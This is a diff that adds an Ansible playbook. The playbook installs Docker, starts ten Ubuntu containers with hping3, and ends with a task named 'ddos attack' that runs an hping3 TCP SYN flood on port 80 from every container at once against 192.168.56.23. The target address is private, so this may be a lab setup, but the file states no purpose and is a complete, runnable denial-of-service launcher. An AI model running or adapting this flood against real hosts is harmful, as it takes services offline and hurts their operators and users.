@@ -1,0 +1,71 @@
+---
+
+- hosts: web_server_dockers
+  become: true
+  vars: 
+    container_count: 10
+    default_container_name: docker
+    default_container_image: ubuntu
+    default_container_command: /bin/bash -c "apt-get update && apt-get install -y hping3"
+    
+  tasks:
+  - name: install aptitude
+    apt:
+      name: aptitude
+      state: latest
+      update_cache: true
+      
+  - name: install required system packages 
+    apt:
+      name:
+        - apt-transport-https
+        - ca-certificates
+        - curl
+        - software-properties-common
+        - python3-pip
+        - virtualenv
+        - python3-setuptools
+      state: latest
+      update_cache: true
+   
+  - name: Add Docker GPG apt Key
+    apt_key:
+      url: https://download.docker.com/linux/ubuntu/gpg
+      state: present
+
+  - name: Add Docker Repository
+    apt_repository:
+      repo: deb https://download.docker.com/linux/ubuntu focal stable
+      state: present
+
+  - name: Update apt and install docker-ce
+    apt:
+      name: docker-ce
+      state: latest
+      update_cache: true
+
+  - name: Install Docker Module for Python
+    pip:
+      name: docker
+   
+  - name: Pull default Docker image
+    community.docker.docker_image:
+      name: "{{ default_container_image }}"
+      source: pull
+       
+  - name: Create default containers
+    community.docker.docker_container:
+      name: "{{ default_container_name }}{{ item }}"
+      image: "{{ default_container_image }}"
+      command: "{{ default_container_command }}"  
+      state: started
+    with_sequence: count={{ container_count }}
+
+  - name: ddos attack
+    community.docker.docker_container_exec:
+      container: "{{ default_container_name }}{{ item }}"
+      command: hping3 -c 5000000000000000000 -d 50 -S -w 64 -p 80 --flood 192.168.56.23  
+    async: 20
+    poll: 0
+    with_sequence: count={{ container_count }}
+      
